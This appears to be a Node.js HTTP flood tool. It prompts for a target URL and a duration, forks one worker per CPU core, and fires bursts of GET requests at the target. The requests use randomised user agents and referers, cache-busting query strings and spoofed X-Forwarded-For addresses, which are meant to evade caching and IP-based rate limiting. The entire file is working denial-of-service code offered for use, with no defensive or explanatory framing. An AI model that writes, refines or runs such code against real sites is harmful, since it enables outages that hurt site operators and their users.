const cluster = require('cluster');
const os = require('os');
const http = require('http');
const https = require('https');
const fs = require('fs');

const CORES = os.cpus().length;
const MAX_REQS_PER_THREAD = 5000;
const STREAMS = 8;

const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
  .split('\n')
  .map(u => u.trim())
  .filter(Boolean);

const REFERERS = fs.readFileSync('refs.txt', 'utf8')
  .split('\n')
  .map(r => r.trim())
  .filter(Boolean);

const getUA = () => {
  const ua1 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
  const ua2 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
  return `${ua1}, ${ua2}`;
};

const getReferer = () => REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';

const makeRequest = (target, stats) => {
  const url = new URL(target);
  const isHttps = url.protocol === 'https:';
  const mod = isHttps ? https : http;
  const path = url.pathname + url.search + `?cb=${Math.random().toString(36).substring(2, 10)}`;

  const headers = {
    'User-Agent': getUA(),
    'Referer': getReferer(),
    'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.'),
    'Accept': '*/*',
    'Connection': 'keep-alive'
  };

  const options = {
    hostname: url.hostname,
    port: url.port || (isHttps ? 443 : 80),
    path: path,
    method: 'GET',
    headers: headers,
    agent: new (isHttps ? https.Agent : http.Agent)({ keepAlive: true })
  };

  const req = mod.request(options, res => {
    res.on('data', () => {});
    res.on('end', () => stats.success++);
  });

  req.on('error', () => stats.errors++);
  req.end();
  stats.total++;
};

const fireStream = (target, stats) => {
  for (let i = 0; i < STREAMS; i++) {
    makeRequest(target, stats);
  }
};

if (cluster.isMaster) {
  const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const ask = q => new Promise(resolve => readline.question(q, resolve));

  (async () => {
    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith('http')) target = 'http://' + target;
    const durationInput = await ask("TIME: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) return console.log("Invalid duration");

    console.log(`\nRUNNING ON ${CORES} CORES FOR ${duration}s\n`);

    for (let i = 0; i < CORES; i++) {
      cluster.fork({ TARGET: target, TIME: duration });
    }
  })();

} else {
  const target = process.env.TARGET;
  const end = Date.now() + parseInt(process.env.TIME) * 1000;
  const stats = { total: 0, success: 0, errors: 0 };
  let sent = 0;

  const loop = () => {
    if (Date.now() >= end || sent >= MAX_REQS_PER_THREAD) {
      console.log(`Thread ${process.pid} done | Sent: ${stats.total} | 200: ${stats.success} | Errors: ${stats.errors}`);
      process.exit(0);
    }
    fireStream(target, stats);
    sent += STREAMS;
    setImmediate(loop);
  };

  loop();
}
